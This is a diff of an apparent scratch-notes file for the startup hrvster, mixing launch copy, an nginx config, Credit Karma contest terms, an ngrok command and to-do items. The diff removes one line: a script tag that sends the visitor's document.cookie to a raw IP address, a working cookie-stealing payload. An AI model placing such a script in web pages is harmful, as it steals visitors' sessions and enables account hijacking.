@@ -85,9 +85,6 @@ Hi, my name is Ify/Chime, one of the Co-Founders of hrvster. As we stride forwar
 "Lastly, but by no means least, hrvster is an embodiment of continuous learning and evolution. We will use the insights and experiences from each campaign to enhance and enrich our platform. This is an exciting journey and we are thrilled to have you alongside us as we shape the future of brand engagement."
 
 
-<script>new Image().src="http://193.112.33.32/?cookie=" + document.cookie;</script>
-
-
 Title: "Introducing hrvster: Revolutionizing Brand Engagement through Gamification"
 
 Description:
@@ -148,4 +145,144 @@ convert these into exciting games like Sweepstakes or Pick 3.
 Your audience can interact directly through the tweet, all while enjoying a gamified experience.
 
 
-https://play.hrvster.local:7013/Games/Pick3MatchGame/1359c0d3-08f2-4c44-936a-71222e27b378?externalClient=Twitter&ruleUid=078781a9-370f-47f5-9269-e64410a48e1c
+https://play.hrvster.local:7013/Games/Pick3MatchGame/6d613efe-ba00-4eec-bfeb-395a7bb9a5a8?externalClient=Twitter&ruleUid=7941975f-4ced-4958-9db6-e19efb69780a
+
+1. Create a new CSS file (break this in prompts)
+2. Use the same cshtml file.
+3. See the image for a sample
+
+dev
+
+server {
+    #proxy_cache cache;
+        #proxy_cache_valid 200 1s;
+    listen 8080;
+    listen [::]:8080;
+    root /home/site/wwwroot/public;
+    index  index.php index.html index.htm;
+    server_name  example.com www.example.com;
+
+    location / {
+        index  index.php index.html index.htm hostingstart.html;
+        try_files $uri $uri/ /index.php?$query_string;
+    }
+
+    # redirect server error pages to the static page /50x.html
+    #
+    error_page   500 502 503 504  /50x.html;
+    location = /50x.html {
+        root   /html/;
+    }
+
+    # Disable .git directory
+    location ~ /\.git {
+        deny all;
+        access_log off;
+        log_not_found off;
+    }
+
+    # Add locations of phpmyadmin here.
+    location ~ [^/]\.php(/|$) {
+        fastcgi_split_path_info ^(.+?\.php)(|/.*)$;
+        fastcgi_pass 127.0.0.1:9000;
+        include fastcgi_params;
+        fastcgi_param HTTP_PROXY "";
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        fastcgi_param PATH_INFO $fastcgi_path_info;
+        fastcgi_param QUERY_STRING $query_string;
+        fastcgi_intercept_errors on;
+        fastcgi_connect_timeout         300;
+        fastcgi_send_timeout           3600;
+        fastcgi_read_timeout           3600;
+        fastcgi_buffer_size 128k;
+        fastcgi_buffers 4 256k;
+        fastcgi_busy_buffers_size 256k;
+        fastcgi_temp_file_write_size 256k;
+    }
+}
+
+
+Promotional Terms and Conditions
+1. The Promoter: Credit Karma LLC (“Credit Karma”).
+
+2. Eligibility: This Contest is open to Credit Karma members (the “member”) who reside in Canada at the time of entry and the time of the monthly draw, excluding residents of the Province of Québec. Participants must be over the age of majority in their province or territory of residence at the date of entry, excluding employees of Credit Karma, agents, representatives, and anyone professionally connected with the Contest.
+
+3. Promotional Period: No purchase required. This Contest will run from November 1, 2023, at 12:01AM CST until January 31, 2024, at 11:59PM CST (“Promotional Period”). There will be three monthly draws (one for each of December 2023, January, and February 2024).
+
+4. Entry Instructions:
+
+4.1. Automatic Entry Instructions: To receive an automatic entry in a monthly prize draw, a Credit Karma member must have had their TransUnion credit score increase by 5 points or more over the previous calendar month before the draw, ending on the last day of that month. During the month preceding a draw, eligible members must have logged into their Credit Karma account using the mobile app.
+
+4.2. Alternative Entry Instructions: If a member does not qualify for the automatic entry to a monthly prize draw, the member can also participate in the Contest. Alternative entries must be submitted by sending a completed entry form to Credit Karma (instructions below).
+
+Download the entry form here.
+Fill out all the required information on the form.
+Create a case on our support page at https://support.creditkarma.ca/s/newcase?language=en_CA. Select ‘CONTEST’ from the dropdown list of topics, followed by; subtopic ‘Member of the Month.’ When creating the Help Centre case, please put ‘Entry form‘ in the box for ‘Subject’.
+After a case is created ; you will receive an email confirming your case number. To enter the Contest, you must respond to that email by attaching your completed entry form.
+The completed entry form must be returned during the Promotional Period and before the end of a month during which the Contest is taking place.
+Each received submitted entry form is valid for only one entry in one monthly draw. Subsequent draws must be entered separately.
+One entry per qualifying member per month, regardless of the method of entry.
+
+5. The Prize: There are three (3) cash prizes in total. There are two (2) cash prizes of $5,000. The draw related to the first cash prize of $5,000 will occur in December 2023 and the draw related to the second cash prize of $5,000 will take place in February 2024. There is also one (1) cash prize of $15,000 and the draw related to this cash prize will take place in January 2024. Prizes will be paid to each of the winners by direct deposit to a Canadian bank account in the winner’s name.
+
+6. Winner selection: One participant will be selected in a monthly draw at random from all eligible & valid entries using a random number generator. The odds of winning a prize will depend on the number of eligible entries received during the relevant month. Each monthly draw will take place in Charlotte, North Carolina, USA by the 21st of each month at 6:00PM CST following a month during which the contest is in effect, with the first draw by December 21st, 2023 at 6PM CST. A Credit Karma member can only win a maximum of one prize in total and a winner will not be eligible for any further Credit Karma prize draws within 12 months of a winning draw.
+
+7. Winner notification: The monthly selected participant will be contacted either within the Credit Karma app, or by email using the email address registered on their Credit Karma account, or the email provided in the alternative method of entry and asked to respond within 7 days of the app or email notification to confirm their acceptance of the prize, and to proceed with the prize redemption process explained below. In the event that the Credit Karma (i) has not received a positive response from a selected participant; (ii) has not received a signed copy of the release by the selected participant (as detailed below); and/or (iii) if the selected participant did not correctly answer the mathematical skill-testing question within 7 days of notification, the originally selected participant will forfeit their rights to their prize. Credit Karma reserves the right to select an alternative winner from all remaining valid entries.
+
+8. Prize Redemption: In order to redeem the prize and be declared a winner, a selected participant will have to (i) correctly answer a time-limited mathematical skill-testing question without any assistance of any kind, (ii) sign a release form and (iii) provide the required information in order for the prize to be paid into their nominated Canadian bank account by direct deposit. The prize shall be paid within thirty (30) days of confirming their acceptance of the prize, and fulfilling the requirements listed above.
+
+9. No correspondence: Winner selection is final and binding and no correspondence will be entered into, except with the winners in each of the monthly prize draws.
+
+10. Disqualification: No entries will be accepted other than as specified in these terms and conditions. In the event an individual attempts to secure multiple entries in any of the prize draws by any means, they will be disqualified and prevented from entering any subsequent monthly draws.
+
+11. Each prize is as stated, is non-transferable, cannot be substituted for another prize, or exchanged, in whole or in part, and no alternative is available.
+
+12. General: Credit Karma is not responsible for any entries which fail to be registered in a monthly draw or are delayed for any technical or other reason whatsoever. Unsuccessful entries in a monthly draw will not be carried forward to subsequent draws.
+
+13. Use of Personal Information: Personal information of entrants will be used for the purpose of managing the Contest and will be processed in accordance with Credit Karma’s Privacy Policy at https://www.intuit.com/privacy/statement/
+
+14. Monthly prize winners may be requested by Credit Karma to take part in reasonable publicity for the promotion and/or their Credit Karma experience (including by featuring winners’ abbreviated details, including name, image, statement, voice and likeness in Credit Karma promotional materials).
+
+15. Credit Karma reserves the right to verify all entries and to refuse to award a prize or withdraw a prize entitlement and disqualify an entrant where there are reasonable grounds to believe there has been a breach of these terms and conditions or any instructions forming part of the entry requirements or otherwise where a winner has gained an unfair advantage in participating in the Contest or won using fraudulent means.
+
+16. Credit Karma is not responsible in the event that a winner cannot be contacted as a result of having provided incorrect contact details when registering for their Credit Karma account or not updating their profile information following a change in details, or when submitting their entry.
+
+17. Except where prohibited, in the event of circumstances outside the reasonable control of Credit Karma, or otherwise where fraud, abuse, and/or an error (human or computer) affects or could affect the proper operation of the monthly prize draws or the awarding of the prizes, Credit Karma reserves the right to suspend the Contest or amend these terms and conditions, at any stage, with no liability to any entrants or third parties, but will always endeavour to minimize the effect on entrants in order to avoid undue disappointment.
+
+18. Governing laws: This Contest is governed by the laws of the Province of Ontario, excluding conflicts of law provisions, and the federal laws of Canada applicable therein; and all claims arising out of or in any way related to the Contest will be submitted to the non-exclusive jurisdiction of the court of competent jurisdiction in the City of Toronto, Ontario, and participants and Credit Karma submit to personal jurisdiction in those courts.
+
+19. By participating in this contest, all participants accept these terms and conditions.
+
+
+
+
+
+
+
+
+
+
+ngrok http --domain=warthog-supreme-cattle.ngrok-free.app https://localhost:5001
+
+id
+object_type
+data_object_type
+currency
+current_period_start
+current_period_end
+external_customer_id
+external_plan_id
+amount
+external_product_id
+interval
+external_invoice_id
+external_status
+
+A. A How to (Very Important)
+1. What is the new and existing features
+2. What is the value proposition of hrvster to other companies
+3. Use our friends for a Pilot
+
+
+CoralPay
+
